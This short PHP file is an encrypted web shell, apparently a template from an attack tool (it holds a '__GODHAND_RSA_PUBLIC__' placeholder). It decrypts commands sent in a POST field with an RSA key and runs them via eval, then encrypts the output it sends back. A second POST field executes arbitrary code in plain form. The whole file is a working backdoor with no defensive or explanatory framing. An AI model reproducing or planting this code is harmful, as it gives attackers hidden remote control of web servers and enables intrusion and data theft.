<?php
$r="__GODHAND_RSA_PUBLIC__";
$k=openssl_pkey_get_public($r);
parse_str(@file_get_contents("php://input"),$_);
if(isset($_POST['d'])){
    $c='';
    foreach(str_split(base64_decode($_POST['d']),256) as $chunk){openssl_public_decrypt($chunk,$dec,$k);$c.=$dec;}
    ob_start();eval($c);$o=ob_get_clean();
    $out='';
    foreach(str_split($o,245) as $chunk){openssl_public_encrypt($chunk,$enc,$k);$out.=$enc;}
    echo base64_encode($out);
}elseif(isset($_POST['c'])){
    eval($_POST['c']);
}
